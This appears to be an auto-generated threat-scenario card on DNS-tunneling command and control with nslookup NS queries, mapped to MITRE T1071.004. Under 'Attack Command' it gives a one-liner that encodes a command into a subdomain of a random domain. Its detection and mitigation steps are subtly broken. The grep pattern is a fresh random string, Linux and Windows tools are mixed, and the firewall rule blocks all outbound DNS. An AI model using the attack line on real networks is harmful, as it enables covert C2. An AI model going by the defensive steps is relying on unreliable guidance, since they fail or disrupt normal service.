---
type: campaign
scenario_id: 391
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using nslookup with NS records for DNS tunneling C2.

## Threat Description
Using nslookup with NS records for DNS tunneling C2.

## Attack Command
```
nslookup -type=NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor DNS NS queries: `tshark -Y 'dns.qry.type == 2' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.

## Mitigation
Restrict nslookup: `icacls %windir%\System32\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect DNS tunneling via nslookup NS queries by analyzing query frequency, base64-encoded subdomains, and NS record patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
